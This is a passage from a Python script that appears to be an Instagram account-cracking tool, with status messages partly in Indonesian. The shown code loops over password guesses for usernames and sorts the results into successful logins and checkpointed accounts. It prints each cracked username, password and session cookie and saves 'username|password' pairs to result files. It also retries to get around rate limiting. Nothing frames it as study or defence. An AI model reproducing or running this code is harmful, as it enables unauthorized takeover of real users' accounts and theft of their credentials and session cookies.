                            ___roz = requests.get(f'https://www.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/igcookie.txt','r').read()}).json()['graphql']['user']
                            follower = ___roz['edge_followed_by']['count']
                            following = ___roz['edge_follow']['count']
                        except (KeyError, IOError):
                            follower = ('-')
                            following = ('-')
                        except:pass
                        print(f"\r{cyan}[{white}✔{cyan}]{white} Status :{black} Success     ")
                        print(f"{cyan}[{white}>{cyan}]{white} Username :{black} {uid}")
                        print(f"{cyan}[{white}>{cyan}]{white} Password :{black} {pw}")
                        print(f"{cyan}[{white}>{cyan}]{white} Follower :{black} {follower}")
                        print(f"{cyan}[{white}>{cyan}]{white} Following :{black} {following}")
                        print(f"{cyan}[{white}>{cyan}]{white} Cookie :{black} {coki}\n")
                        self.ok.append(f"{uid}|{pw}")
                        open('Results/Ok.txt','a').write(f"{uid}|{pw}\n")
                        break
                    elif 'checkpoint_required' in str(response):
                        try:
                            ___roz = requests.get(f'https://www.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/igcookie.txt','r').read()}).json()['graphql']['user']
                            follower = ___roz['edge_followed_by']['count']
                            following = ___roz['edge_follow']['count']
                        except (KeyError, IOError):
                            follower = ('-')
                            following = ('-')
                        except:pass
                        print(f"\r{cyan}[{white}✘{cyan}]{white} Status :{yellow} Checkpoint    ")
                        print(f"{cyan}[{white}>{cyan}]{white} Username :{yellow} {uid}")
                        print(f"{cyan}[{white}>{cyan}]{white} Password :{yellow} {pw}")
                        print(f"{cyan}[{white}>{cyan}]{white} Follower :{yellow} {follower}")
                        print(f"{cyan}[{white}>{cyan}]{white} Following :{yellow} {following}\n")
                        self.cp.append(f"{uid}|{pw}")
                        open('Results/Cp.txt','a').write(f"{uid}|{pw}\n")
                        break
                    elif 'Please wait' in str(response):
                        print(f"{white}[{red}!{white}]{red} Gunakan Mode Pesawat 2 Detik", end='\r')
                        sleep(7)
                        __main__(self, user, uid, pwx)
                    else:
                        continue
            self.kill +=1
            print(f"{white}[{white}Crack{white}]{white} {self.kill}/{str(len(user))} Cp:-{len(self.cp)} Ok:-{len(self.ok)}          ", end='\r')
        except (ConnectionError):
            print(f"{red}!] Connection Error{white}!               ", end='\r')
            sleep(7)
            __main__(self, user, uid, pwx)
        except:__main__(self, user, uid, pwx)

if __name__=='__main__':
    ___menu___()
